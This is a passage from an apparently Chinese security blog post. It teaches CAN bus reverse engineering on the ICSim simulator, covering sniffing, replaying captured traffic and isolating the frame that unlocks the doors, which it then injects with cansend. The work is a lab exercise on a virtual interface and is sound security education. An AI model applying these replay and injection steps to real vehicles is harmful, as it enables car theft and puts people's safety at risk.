loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;可以通过aptitude安装来解决，具体安装步骤如下：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;sudo apt-get update \nsudo apt-get install aptitude\nsudo aptitude install libibus-1.0-dev\nsudo apt-get install gcc\ngit clone https://github.com/zombieCraig/ICSim\ncd ICSim\nmake\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;至此ICSim安装完成，目录内容如下：&lt;br&gt;\n&lt;img src=\&#34;https://p3.ssl.qhimg.com/t012c81b11ee13908a0.png\&#34; alt=\&#34;ICsim安装完成\&#34; title=\&#34;ICsim安装完成\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;切换到ICSim目录，执行如下命令。&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;./setup_vcan.sh         #初始化，每次重启后都要重新运行\n./icsim vcan0           #模拟器\n./controls vcan0        #控制面\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;运行后可以看到如下界面，像游戏手柄的界面是控制面板（这里可以插入USB游戏手柄进行控制，笔者这里没有，有USB手柄的大家可自行测试）。另外有仪表盘的窗口是模拟器，速度表停在略高于0mph的位置，如果指针有摆动就说明ICSim工作正常。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://p4.ssl.qhimg.com/t01ffdc6dd4e1d1e56f.png\&#34; alt=\&#34;ICSim启动\&#34; title=\&#34;ICSim启动\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;其控制器的按键说明如下：&lt;/p&gt;\n&lt;table&gt;\n&lt;thead&gt;\n&lt;tr&gt;\n&lt;th&gt;功能&lt;/th&gt;\n&lt;th&gt;按键&lt;/th&gt;\n&lt;/tr&gt;\n&lt;/thead&gt;\n&lt;tbody&gt;\n&lt;tr&gt;\n&lt;td&gt;加速&lt;/td&gt;\n&lt;td&gt;上方向键&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;左转向&lt;/td&gt;\n&lt;td&gt;左方向键&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;右转向&lt;/td&gt;\n&lt;td&gt;右方向键&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;开/关左车门（前）锁&lt;/td&gt;\n&lt;td&gt;右/左shift+A&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;开/关右车门（前）锁&lt;/td&gt;\n&lt;td&gt;右/左shift+B&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;开/关左车门（后）锁&lt;/td&gt;\n&lt;td&gt;右/左shift+X&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;开/关右车门（后）锁&lt;/td&gt;\n&lt;td&gt;右/左shift+Y&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;开启所有车门锁&lt;/td&gt;\n&lt;td&gt;右shift+左shift&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;关闭所有车门锁&lt;/td&gt;\n&lt;td&gt;左shift+右shift&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/tbody&gt;\n&lt;/table&gt;\n&lt;p&gt;上面的&lt;code&gt;setup_vcan.sh&lt;/code&gt; 主要功能是加载CAN和vCAN（virtual controller area network）网络模块。并创建名为vcan0的网络设备并打开连接。&lt;br&gt;\n&lt;code&gt;setup_vcan.sh&lt;/code&gt;文件内容如下：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;sudo modprobe can\nsudo modprobe vcan\nsudo ip link add dev vcan0 type vcan\nsudo ip link set up vcan0\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;运行后，我们可以使用ifconfig来查看网络接口，发现会多出来一个vcan0的网络接口。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;2\&#34;&gt;&lt;img src=\&#34;https://p5.ssl.qhimg.com/t01cd5ca29d841c211e.png\&#34; alt=\&#34;vcan网络接口\&#34; title=\&#34;vcan网络接口\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;h3 id=\&#34;can-utils安装\&#34;&gt;can-utils安装&lt;/h3&gt;\n&lt;p&gt;can-utils是CAN实用的工具套件，包含了许多实用程序。&lt;/p&gt;\n&lt;p&gt;GITHUB地址：&lt;a href=\&#34;https://github.com/linux-can/can-utils\&#34;&gt;https://github.com/linux-can/can-utils&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;经常用到的几个程序如下，更多命令可以看github地址：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;candump : 显示、过滤和记录CAN数据到文件。candump并不会解码数据。&lt;/li&gt;\n&lt;li&gt;canplayer : 对记录的CAN数据进行重放。&lt;/li&gt;\n&lt;li&gt;cansend : 发送CAN数据。&lt;/li&gt;\n&lt;li&gt;cansniffer : 显示CAN数据并高亮显示变化的字节。&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;当前环境使用的Kali Linux 2020直接使用如下命令安装即可。如果你的系统不支持，则可以直接下载github上的源码，使用make命令进行编译安装。&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;sudo apt-get install can-utils\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&#34;kayak\&#34;&gt;Kayak&lt;/h3&gt;\n&lt;p&gt;Kayak可以直接通过github下载release版本的。但是，该工具的使用需要配合socketcand。&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;socketcand安装&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre&gt;&lt;code&gt;sudo apt install automake\ngit clone https://github.com/linux-can/socketcand.git\ncd socketcand\n./autogen.sh\n./configure\nmake\nsudo make install\n&lt;/code&gt;&lt;/pre&gt;\n&lt;ul&gt;\n&lt;li&gt;Kayak下载&lt;br&gt;\nGITHUB下载：&lt;a href=\&#34;https://github.com/dschanoeh/Kayak/releases\&#34;&gt;https://github.com/dschanoeh/Kayak/releases&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;解压缩后，bin文件夹下有windows版本和linux的运行程序。Kali下直接在terminal下运行./kayak 即可。当然这里也可以下载源代码，并使用maven编译。&lt;/p&gt;\n&lt;h2 id=\&#34;前置知识\&#34;&gt;前置知识&lt;/h2&gt;\n&lt;p&gt;上面已经准备好了环境，在真正开始分析之前，先简单说一些前置知识。&lt;/p&gt;\n&lt;h3 id=\&#34;can总线\&#34;&gt;CAN总线&lt;/h3&gt;\n&lt;ol&gt;\n&lt;li&gt;CAN运行在两条线路上：CAN高电平（CANHI）和CAN低电平（CANLO）。&lt;/li&gt;\n&lt;li&gt;CAN bus 有四种帧类型&lt;/li&gt;\n&lt;/ol&gt;\n&lt;table&gt;\n&lt;thead&gt;\n&lt;tr&gt;\n&lt;th&gt;帧类型&lt;/th&gt;\n&lt;th&gt;用途&lt;/th&gt;\n&lt;/tr&gt;\n&lt;/thead&gt;\n&lt;tbody&gt;\n&lt;tr&gt;\n&lt;td&gt;数据帧（Data Frame）&lt;/td&gt;\n&lt;td&gt;包含要传输的节点数据的帧&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;远程帧（Remote Frame）&lt;/td&gt;\n&lt;td&gt;请求传输特定标识符的帧&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;错误帧（Remote Frame）&lt;/td&gt;\n&lt;td&gt;任何检测到错误的节点发送的帧&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;重载帧（Overload Frame）&lt;/td&gt;\n&lt;td&gt;在数据或远程帧之间插入延迟的帧&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/tbody&gt;\n&lt;/table&gt;\n&lt;ol start=\&#34;3\&#34;&gt;\n&lt;li&gt;CAN有两种类型的消息(帧)格式：标准（基础）帧格式和扩展帧格式。标准（基础）帧有11位标识符，扩展帧格式有29位标识符。CAN标准帧格式和CAN扩展帧格式之间的区别是通过使用IDE位进行的，IDE位在11位帧的情况下以显性方式传输，而在29位帧的情况下以隐性方式进行传输。支持扩展帧格式消息的CAN控制器也能够以CAN基本帧格式发送和接收消息。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;ul&gt;\n&lt;li&gt;标准帧格式&lt;br&gt;\n说一下主要的4个元素，其他的大家感兴趣可自行去了解：\n&lt;ul&gt;\n&lt;li&gt;仲裁ID（Arbitration ID）：仲裁ID是一种广播消息，用来识别正视图通信的设备的ID，其实也代表发送消息的地址。任何的设备都可以发送多个仲裁ID。在总线中同时发送的消息，低仲裁ID的消息拥有优先权。&lt;/li&gt;\n&lt;li&gt;标识符扩展（IDE）：标准帧格式该位始终是0。&lt;/li&gt;\n&lt;li&gt;数据长度码（DLC）：表示数据的大小，番位是0字节到8字节。&lt;/li&gt;\n&lt;li&gt;数据（Data）：总线传输数据本身。一个标准的数据帧可携带最大尺寸为8字节。有些系统中会强制要求8字节，不满8字节则填充为8字节。&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;3\&#34;&gt;&lt;img src=\&#34;https://p1.ssl.qhimg.com/t012f6fcd1baa40a15f.png\&#34; alt=\&#34;CAN总线协议\&#34; title=\&#34;CAN总线协议\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;ul&gt;\n&lt;li&gt;扩展帧格式&lt;br&gt;\n扩展帧格式与标准帧格式类似，扩展帧格式可以连接在一起，形成更长的ID。拓展帧格式可包含标准帧格式。拓展帧格式的标识符扩展IDE被设置为1。扩展帧有一个18位的标识符，是标准的11位标识符的第二部分。&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h3 id=\&#34;can总线威胁\&#34;&gt;CAN总线威胁&lt;/h3&gt;\n&lt;p&gt;根据CAN总线的特性，我们则可以了解CAN面临的威胁：&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;CAN总线通信是广播的方式，所以数据是可以被监听和获取的。&lt;/li&gt;\n&lt;li&gt;CAN总线协议中ID代表报文优先级，协议中没有原始地址信息。也就是说任何人都可以伪造和发送虚假或恶意的报文。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;另外拒绝服务攻击在CAN总线协议中也是存在的。但是我们主要是分析和逆向CAN总线。这里不做相关说明。&lt;/p&gt;\n&lt;h3 id=\&#34;监听can流量\&#34;&gt;监听CAN流量&lt;/h3&gt;\n&lt;p&gt;监听CAN流量有多种方法。首先请保证启动ICSim。&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;can-utils 工具包监听&lt;/li&gt;\n&lt;/ol&gt;\n&lt;pre&gt;&lt;code&gt;candump -l vcan0\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;输入该命令后会监听流量并以candump-YYYY-MM-DD_time.log格式的文件名保存到当前目录下。如candump-2020-06-22_103240.log。按ctrl+c停止监听。&lt;br&gt;\n打开文件，数据格式如下：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;(1592836523.941032) vcan0 164#0000C01AA8000022\n(1592836523.941168) vcan0 17C#0000000010000003\n(1592836523.941285) vcan0 18E#00004D\n(1592836523.941387) vcan0 1CF#80050000000F\n(1592836523.941745) vcan0 1DC#0200000C\n(1592836523.943317) vcan0 183#0000000E0000100D\n(1592836523.943545) vcan0 143#6B6B00C2\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;括号内的是时间戳，vcan0为我们的虚拟can接口。后面的是ID和数据，ID和数据以#号分割。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;4\&#34;&gt;&lt;img src=\&#34;https://p4.ssl.qhimg.com/t01b672639867e53755.png\&#34; alt=\&#34;candump\&#34; title=\&#34;candump\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;也可以去掉-l选项，直接在屏幕上可以打印数据包。&lt;/p&gt;\n&lt;p&gt;candump是监听并记录原始数据，会有很多对我们无用的数据。can-utils工具包中还有一款可以根据仲裁ID进行分组显示，并对变化的数据以红色显示，它就是cansniffer。&lt;br&gt;\n命令：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;cansniffer -c vcan0\n&lt;/code&gt;&lt;/pre&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;5\&#34;&gt;&lt;img src=\&#34;https://p0.ssl.qhimg.com/t01ae91fe1caf0be3b1.png\&#34; alt=\&#34;cansniffer\&#34; title=\&#34;cansniffer\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;cansniffer可以通过发送按键来过滤显示数据包。注意，当输入按键时，并不会在终端中显示，输入完成后按回车键（一定要记得按）。如下例子则是先关闭所有数据包显示（-000000），然后仅显示ID133和ID244的数据包。&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;-000000\n+133\n+244\n&lt;/code&gt;&lt;/pre&gt;\n&lt;ol start=\&#34;2\&#34;&gt;\n&lt;li&gt;\n&lt;p&gt;Wireshark 监听&lt;br&gt;\nwireshark功能简直太强大了，它也可以捕获CAN数据报文。打开wireshark，选择vcan0接口即可监听流量。info列中可以看到ID和数据。wireshark也是原始流量，并为进行去重。&lt;br&gt;\n&lt;img src=\&#34;https://p5.ssl.qhimg.com/t01f244f261e0e195c2.png\&#34; alt=\&#34;wireshark捕获can协议数据\&#34; title=\&#34;wireshark捕获can协议数据\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;Kayak监听&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;运行socketcand -i vcan0，socketcand可以挂接多个CAN设备，接口名使用逗号分割即可。&lt;/li&gt;\n&lt;li&gt;然后切换到Kayak的bin目录下，运行./kayak。&lt;/li&gt;\n&lt;li&gt;单击File菜单-&amp;gt;new project(或者ctrl+n快捷键)，输入project名字。&lt;/li&gt;\n&lt;li&gt;展开右下角connections窗口中的auto discovery，将下面的内容拖到新建的project中并输入一个名字。&lt;/li&gt;\n&lt;li&gt;右键上一步中创建的bus，选择OPEN Raw View。&lt;/li&gt;\n&lt;li&gt;单击工具栏中的play 按钮。开始捕获CAN总线流量。点击colorize可以对有变化的数据以不同颜色。同时还可以暂停和停止监听流量操作。&lt;br&gt;\n&lt;img src=\&#34;https://p0.ssl.qhimg.com/t019d504620fd505278.png\&#34; alt=\&#34;Kayak捕获CAN数据\&#34; title=\&#34;Kayak捕获CAN数据\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;candump和wireshark监听的流量都是原始流量，我们看到的数据非常多。而Kayak可以按照仲裁ID来进行分组显示，并对不同的&lt;/p&gt;\n&lt;h3 id=\&#34;重放can流量\&#34;&gt;重放CAN流量&lt;/h3&gt;\n&lt;p&gt;canplayer程序可以重放candump记录的流量内容。&lt;br&gt;\n输入如下命令即可重放。&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;canplayer -i candump的log文件\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;重放时，可以观察下ICSim仪表盘是否有变化。&lt;/p&gt;\n&lt;p&gt;对于CAN分析的工具不仅只有这几个，也可以多尝试其他网络上的工具。&lt;/p&gt;\n&lt;h2 id=\&#34;can消息逆向\&#34;&gt;CAN消息逆向&lt;/h2&gt;\n&lt;p&gt;在实战中，各个制造商和车型都有自己唯一的CAN数据包格式，而分析通信数据主要是目的是找到某个特定的信号，例如开车门锁，启动车等。通过上面监听数据，可以看到会有很多数据，这主要由于汽车本身会有很多设备会按照制定的间隔发送数据，这些数据可以称为噪音，这对分析某个具体动作带来麻烦。所以需要对CAN消息进行逆向分析。&lt;/p&gt;\n&lt;h3 id=\&#34;二分法\&#34;&gt;二分法&lt;/h3&gt;\n&lt;ol&gt;\n&lt;li&gt;首先通过candump监听数据。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;pre&gt;&lt;code&gt;candump -l vcan0\n&lt;/code&gt;&lt;/pre&gt;\n&lt;ol start=\&#34;2\&#34;&gt;\n&lt;li&gt;回到控制器界面，进行开门锁操作，然后在关闭车门锁。&lt;/li&gt;\n&lt;li&gt;停止监听数据。数据保存到执行&lt;code&gt;mv candump-2020-06-22_140718.log source&lt;/code&gt; (文件名根据实际情况修改)&lt;/li&gt;\n&lt;li&gt;关车门锁操作，执行&lt;code&gt;canplayer -I source&lt;/code&gt; 重放数据。确认车门锁是否开启。如果没有，请重复上面的步骤。&lt;/li&gt;\n&lt;li&gt;输入 &lt;code&gt;wc -l source&lt;/code&gt; 命令查看文件行数。笔者这里结果为11407行。&lt;/li&gt;\n&lt;li&gt;输入 &lt;code&gt;split -l 6000 source c1&lt;/code&gt; 将source文件分成两个文件。&lt;/li&gt;\n&lt;li&gt;使用canplayer重放两个分割后的文件，查看重放的哪个文件打开来车门锁。每次重放前都要执行 &lt;code&gt;canplayer -I source&lt;/code&gt;。主要是保证每次重放分割的文件前车门锁是关闭的。&lt;/li&gt;\n&lt;li&gt;根据第6和7的步骤对包含重放命令的文件进行。这里要注意每次split命令分割的行数减少1倍。例如第二次执行的名为 &lt;code&gt;split -l 3000 c1aa c2&lt;/code&gt; 。重放命令为 &lt;code&gt;canplayer -I c2aa&lt;/code&gt;和&lt;code&gt;canplayer -I c2ab&lt;/code&gt;。这样一直重复知道发现最终的数据包。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;经过上面的重复，在13ab的文件中定位到来了ID值和发送的数据。使用 &lt;code&gt;cansend vcan0 19B#00000E000000&lt;/code&gt; 进行验证。打开车门锁成功。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;6\&#34;&gt;&lt;img src=\&#34;https://p0.ssl.qhimg.com/t01070f3b96da292d31.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;h3 id=\&#34;统计法\&#34;&gt;统计法&lt;/h3&gt;\n&lt;p&gt;对于一些只有在进行操作时才会产生的动作，可以通过选择特定的次数，对其发送的次数进行筛选。&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;使用 &lt;code&gt;candump -l vcan0&lt;/code&gt; 捕获数据包。&lt;/li&gt;\n&lt;li&gt;在控制器界面中操作5次车门锁操作。&lt;/li&gt;\n&lt;li&gt;停止candump。获得保存文件，这里为&lt;code&gt;candump-2020-06-22_151059.log&lt;/code&gt;。&lt;/li&gt;\n&lt;li&gt;通过编写好的脚本，运行 &lt;code&gt;python3 can.py candump-2020-06-22_151059.log&lt;/code&gt;获得结果&lt;/li&gt;\n&lt;/ol&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;7\&#34;&gt;&lt;img src=\&#34;https://p4.ssl.qhimg.com/t019248468c787ec30c.png\&#34; alt=\&#34;统计法逆向CAN\&#34; title=\&#34;统计法逆向CAN\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;脚本很简单，主要就是遍历所有数据，对ID进行计数统计并显示最终结果，输入ID值可显示对应的数据内容。使用python 20行代码就可以搞定。大家可以自己编写下。&lt;/p&gt;\n&lt;h3 id=\&#34;观察法\&#34;&gt;观察法&lt;/h3&gt;\n&lt;p&gt;有了上面的一些经验积累后，借助可视化界面来对数据进行观察也可以逆向出其总线ID。&lt;br&gt;\n按照上面启动Kayak的方法，启动监听数据。工具已经对ID进行来分组。将模拟器，控制器和Kayak放在同一个屏幕上。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;8\&#34;&gt;&lt;img src=\&#34;https://p4.ssl.qhimg.com/t01908719cea2669673.png\&#34; alt=\&#34;Kayak观察法\&#34; title=\&#34;Kayak观察法\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;在控制器界面按下左键，模拟器界面左转向灯闪了一下，观察Kayak界面数据变化，在左转向灯闪时（也就是按下左键时），看哪一个值变了又变会原值，并保持原值。最终定位ID值为188。&lt;/p&gt;\n&lt;p&gt;现在在进行另外一个例子，在汽车加速过程中，转速表是一直在上升。这就可以通过观察哪一个值是在持续上升的。这里通过控制器界面，按住上方向键，观察哪一个值是在持续增加的。最终定位ID值为244。&lt;/p&gt;\n&lt;p&gt;可以通过cansend来进行验证，是否成功。&lt;/p&gt;\n&lt;p&gt;当然除了使用Kayak外，也可以尝试cansniffer。&lt;/p&gt;\n&lt;h2 id=\&#34;icsim难度设置\&#34;&gt;ICSim难度设置&lt;/h2&gt;\n&lt;p&gt;以上介绍的几种方法各有利弊，不能满足所有情况，实际的情况会非常复杂，需根据实际情况进行选择。&lt;br&gt;\n对于CAN总线的分析，ICSim支持从0到3的4个级别，默认难度为1级，0为最简单，3是最难。还可以设置随机化的种子值。&lt;br&gt;\n输入 &lt;code&gt;./icsim -r vcan0&lt;/code&gt; 命令可以显示出随机的种子值。当然也可以使用 &lt;code&gt;./icsim -s 1419525411 vcan0&lt;/code&gt; 来设置种子值，这样仿真器就可以选择不同的ID和目标字节位置了。&lt;br&gt;\n输入 &lt;code&gt;./icsim -l 3 vcan0&lt;/code&gt; 命令设置挑战难度。&lt;br&gt;\n大家可以自行尝试增加难度来进行挑战。&lt;/p&gt;\n&lt;h2 id=\&#34;总结\&#34;&gt;总结&lt;/h2&gt;\n&lt;p&gt;本文主要以ICSim模拟CAN总线数据，通过多种方式来对CAN总线进行逆向分析，重在方法和工具使用。部分内容并未过多提及，如果一旦拓展开来，需要写的内容实在太多。感兴趣的大家可自行进行深入学习和了解。如果在进行实车的分析和测试也要注意自身安全，提前做好计划和保障。&lt;/p&gt;\n&lt;h2 id=\&#34;参考或引用来源\&#34;&gt;参考或引用来源&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;https://github.com/zombieCraig/ICSim&lt;/li&gt;\n&lt;li&gt;https://github.com/linux-can/can-utils&lt;/li&gt;\n&lt;li&gt;https://github.com/dschanoeh/Kayak/releases&lt;/li&gt;\n&lt;li&gt;https://tryhackme.com/room/carhacking101&lt;/li&gt;\n&lt;li&gt;https://www.securitynewspaper.com/2018/05/03/hack-car-tool/&lt;/li&gt;\n&lt;li&gt;https://github.com/jaredthecoder/awesome-vehicle-security#python&lt;/li&gt;\n&lt;li&gt;https://dschanoeh.github.io/Kayak/tutorial.html&lt;/li&gt;\n&lt;li&gt;https://www.hackers-arise.com/post/2017/08/08/automobile-hacking-part-2-the-can-utils-or-socketcan&lt;/li&gt;\n&lt;li&gt;https://www.hackers-arise.com/post/2017/08/04/automobile-hacking-part-1-the-can-protocol&lt;/li&gt;\n&lt;li&gt;https://en.wikipedia.org/wiki/CAN_bus&lt;/li&gt;\n&lt;li&gt;https://mp.weixin.qq.com/s/jvzLn2ZTmId4cfqBNJxYyg&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h2 id=\&#34;参考书籍或文档\&#34;&gt;参考书籍或文档&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;《智能网联汽车安全》&lt;/li&gt;\n&lt;li&gt;《汽车黑客大曝光》&lt;/li&gt;\n&lt;li&gt;《Car Hacking: Accessing and Exploiting the CAN Bus Protocol》&lt;/li&gt;\n&lt;/ol&gt;\n&#34;,&#34;fileName&#34;:&#34;hacking-all-the-cars-can-bus-reverse&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;本文主要是通过ICSim(Instrument Cluster Simulator)模拟CAN协议通信，通过实践对CAN总线协议进行逆向分析。在实践过程中踩过一些坑，这里跟大家分享交流。&lt;/p&gt;\n&lt;h2 id=\&#34;简介\&#34;&gt;简介&lt;/h2&gt;\n&lt;p&gt;CAN(Controller Area Network)总线是制造业和汽车产业中使用的一种简单协议，为ISO国际标准化的串行通信协议。在现代汽车中的小型嵌入式系统和ECU能够使用CAN协议进行通信，其通信是采用的广播机制，与TCP协议中的UDP差不多。各个系统或ECU（电子控制单元）都可以收发控制消息。1996年起该协议成了美国轿车和轻型卡车的标准协议之一，但是直到2008年才成为强制标准（2001年成为欧洲汽车标准）。当然1996年之前的也有可能使用CAN总线。现在，汽车的电子组件均通过CAN总线连接，针对汽车的攻击最终也都会通过CAN总线来实现。对于研究汽车安全，CAN总线协议是必须要掌握的。&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;Hacking All The Cars之CAN总线逆向&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;automotive&#34;,&#34;slug&#34;:&#34;prvJjB7Fua5&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/prvJjB7Fua5/&#34;},{&#34;name&#34;:&#34;car&#34;,&#34;slug&#34;:&#34;NB7AfDzqlwN&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/NB7AfDzqlwN/&#34;},{&#34;name&#34;:&#34;automobile&#34;,&#34;slug&#34;:&#34;1aT1kB9-ztJ&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/1aT1kB9-ztJ/&#34;},{&#34;name&#34;:&#34;canbus&#34;,&#34;slug&#34;:&#34;cQtULUfiy8G&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/cQtULUfiy8G/&#34;},{&#34;name&#34;:&#34;hacking&#34;,&#34;slug&#34;:&#34;-ktgVSa4eO2&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/-ktgVSa4eO2/&#34;}],&#34;date&#34;:&#34;2020-07-28 07:28:10&#34;,&#34;dateFormat&#34;:&#34;2020-07-28&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/hacking-all-the-cars-can-bus-reverse/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;15 min read&#34;,&#34;time&#34;:866000,&#34;words&#34;:3828,&#34;minutes&#34;:15},&#34;description&#34;:&#34;本文主要是通过ICSim(Instrument Cluster Simulator)模拟CAN协议通信，通过实践对CAN总线协议进行逆向分析。在实践过程中踩过一些坑，这里跟大家分享交流。\n简介\nCAN(Controller Area Net...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%AE%80%E4%BB%8B\&#34;&gt;简介&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%87%86%E5%A4%87\&#34;&gt;环境与准备&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#icsim%E7%BC%96%E8%AF%91\&#34;&gt;ICSim编译&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#can-utils%E5%AE%89%E8%A3%85\&#34;&gt;can-utils安装&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#kayak\&#34;&gt;Kayak&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86\&#34;&gt;前置知识&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#can%E6%80%BB%E7%BA%BF\&#34;&gt;CAN总线&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#can%E6%80%BB%E7%BA%BF%E5%A8%81%E8%83%81\&#34;&gt;CAN总线威胁&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%9B%91%E5%90%ACcan%E6%B5%81%E9%87%8F\&#34;&gt;监听CAN流量&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E9%87%8D%E6%94%BEcan%E6%B5%81%E9%87%8F\&#34;&gt;重放CAN流量&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#can%E6%B6%88%E6%81%AF%E9%80%86%E5%90%91\&#34;&gt;CAN消息逆向&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%BA%8C%E5%88%86%E6%B3%95\&#34;&gt;二分法&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%BB%9F%E8%AE%A1%E6%B3%95\&#34;&gt;统计法&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%A7%82%E5%AF%9F%E6%B3%95\&#34;&gt;观察法&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#icsim%E9%9A%BE%E5%BA%A6%E8%AE%BE%E7%BD%AE\&#34;&gt;ICSim难度设置&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%80%BB%E7%BB%93\&#34;&gt;总结&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%8F%82%E8%80%83%E6%88%96%E5%BC%95%E7%94%A8%E6%9D%A5%E6%BA%90\&#34;&gt;参考或引用来源&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a 